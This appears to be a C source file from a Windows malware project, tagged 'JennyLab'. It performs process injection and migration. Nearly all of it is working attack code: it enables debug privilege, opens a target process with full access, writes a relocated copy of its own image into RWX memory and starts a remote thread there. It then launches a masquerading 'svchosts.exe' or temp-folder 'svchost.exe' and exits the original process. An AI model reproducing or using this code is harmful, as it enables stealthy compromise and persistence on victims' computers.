#include "api.h"
#include "windows.h"
#include "process.h"
#include "misc.h"
#include "inject.h"


//Found in Windows 7 SP1 // 32bits
void __stdcall procMigrate(void *params) {
	char winEXE[2048];
	char tmpEXE[2048];

	_ZeroMemory(winEXE, 2048);
	_ZeroMemory(tmpEXE, 2048);

	_GetWindowsDirectoryA(winEXE, 2048);
	_lstrcatA(winEXE, "\\svchosts.exe");

	_MessageBoxA(_GetForegroundWindow(), "Injected it", "@cr1m3//JennyLab", 0x01);

	if(_PathFileExistsA(winEXE)==1) {
		_ShellExecuteA(0x00, 0x00, winEXE, 0x00, 0x00, 0x00);
	}
	else {
		_GetTempPathA(2048,tmpEXE);
		_lstrcatA(tmpEXE,"svchost.exe");
		if(_PathFileExistsA(tmpEXE)==1) {
			_ShellExecuteA(0x00, 0x00, tmpEXE, 0x00,0x00, 0x00);
		}

		else {
			_MessageBoxA(_GetForegroundWindow(),_GetCommandLineA(),"Lala", 1);
		}

	}

	while(1) {
		_Sleep(15000);
	}


	_ExitThread(0x4a);
}

void __stdcall procTest(void *params) {
	char myName[1024];

	_ZeroMemory(myName, 1024);
	_GetModuleFileNameA(NULL, myName, 1024); 
	_MessageBoxA(0x00, myName, "j3nnyl4b", 0x00);

	while(1) {
		_Sleep(15000);
	}

	_ExitThread(0x00);
}



int __inject_migration(int pid) {
	__inject_thread(procMigrate, pid, 1);
	return 0;
}

int __inject_thread(void *thread_addr, int pid, int is_exit) {
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_DATA_DIRECTORY pIDD;
	PIMAGE_BASE_RELOCATION pIBR;
	
	void *hModule;
	PVOID image,mem,StartAddress;
	HANDLE hProcess,hThread;
	DWORD i,count,nSizeOfImage;
	DWORD_PTR delta,OldDelta;
	unsigned short *list;
	PDWORD_PTR p;
	int bl;
	

	OBJECT_ATTRIBUTES oa;
	CLIENT_ID cid;

		 

	_RtlAdjustPrivilege(20,TRUE,FALSE,&bl);


	hModule=_GetModuleHandleA(NULL);
	pINH=_RtlImageNtHeader(hModule);

	
	nSizeOfImage=pINH->OptionalHeader.SizeOfImage;

	InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);

	cid.UniqueProcess=(HANDLE)pid;
	cid.UniqueThread=0;


	_NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&cid);
	mem=_VirtualAllocEx(hProcess,NULL,nSizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	image=_VirtualAlloc(NULL,nSizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	__memcpy(image,hModule,nSizeOfImage);

	pIDD=&pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)image+pIDD->VirtualAddress);

	delta=(DWORD_PTR)((LPBYTE)mem-pINH->OptionalHeader.ImageBase);
	OldDelta=(DWORD_PTR)((LPBYTE)hModule-pINH->OptionalHeader.ImageBase);

	while(pIBR->VirtualAddress!=0)
	{
		if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
		{
			count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
			list=(unsigned short *)((LPBYTE)pIBR+sizeof(IMAGE_BASE_RELOCATION));

			for(i=0;i<count;i++)
			{
				if(list[i]>0)
				{
					p=(PDWORD_PTR)((LPBYTE)image+(pIBR->VirtualAddress+(0x0fff & (list[i]))));

					*p-=OldDelta;
					*p+=delta;
				}
			}
		}

		pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR+pIBR->SizeOfBlock);
	}

	
	_NtWriteVirtualMemory(hProcess,mem,image,nSizeOfImage,NULL);
	StartAddress=(PVOID)((LPBYTE)mem+(DWORD_PTR)(LPBYTE)thread_addr-(LPBYTE)hModule);
	
	_RtlCreateUserThread(hProcess,NULL,FALSE,0,0,0,StartAddress,mem,&hThread,NULL);

	if(is_exit!=0) {
		//_NtWaitForSingleObject(hThread,FALSE,NULL);
		//_NtClose(hThread);
		//_NtClose(hProcess);
		//_VirtualFree(image,0,MEM_RELEASE);
		_ExitProcess(0x00);
	}

	//_NtWaitForSingleObject(hThread,FALSE,NULL);
	//_NtClose(hThread);
	//_VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
	//_NtClose(hProcess);
	//_VirtualFree(image,0,MEM_RELEASE);

	if(hThread>0) //sin comprobar
		return 1;
	
	return 0;
}
